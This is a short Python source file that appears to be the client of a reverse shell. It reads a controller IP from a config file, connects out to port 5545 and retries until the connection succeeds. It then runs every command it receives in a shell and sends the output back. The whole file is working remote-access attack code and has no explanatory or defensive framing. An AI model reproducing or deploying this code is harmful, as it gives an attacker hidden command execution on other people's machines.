from subprocess import *
import socket
from threading import Thread 
from time import sleep
import configparser
import os

def getIP(parser):
    parser.read("client.inf")
    return parser['IP']['ip']

parser = configparser.ConfigParser()
ip = getIP(parser)

connected = False

s = socket.socket()


while (connected == False):
    try:
        s.connect((ip,5545))
        connected = True
    except Exception as e:
        print(e)
        sleep(3)
        

del connected

global res
res = [] 

print("connected")
def cevir(data55):
    proc = Popen(data55, shell =True, stdout = PIPE ,stderr = PIPE)
    data , data2 = proc.communicate()
    res.append(data)
    res.append(data2)

while True:  
    f = s.recv(128).decode('utf-8')
    print(f[2:])
    if ("service") in f:
        veri = Thread(target = cevir, args=(f,)) 
        veri.start() 
        veri.join()
        s.send("Completed succesfullly...".encode('utf-8'))
        res = [] 
        continue
    if f == "cd":
        veri = Thread(target = cevir, args=(f,)) 
        veri.start() 
        veri.join()
        s.send(res[0])
        s.send(res[1])
        res = []
        continue
        
    elif f[:2] == "cd" and f[2:] != '':
        os.chdir(f[2:])
        s.send("Completed successfuly...".encode('utf-8'))
        res = []
        continue
    else:
        veri = Thread(target = cevir, args=(f,)) 
        veri.start() 
        veri.join()
        veri_f = res[0]
        veri_f2 = res[1]
        print(veri_f,veri_f2)
        print((veri_f == b'') and (veri_f2 == b''))
        if ((veri_f == b'') and (veri_f2 == b'')):
            s.send("Completed successfuly...".encode('utf-8'))
            res = []     
            continue
        s.send(veri_f)
        s.send(veri_f2)
        res = [] 

s.close()

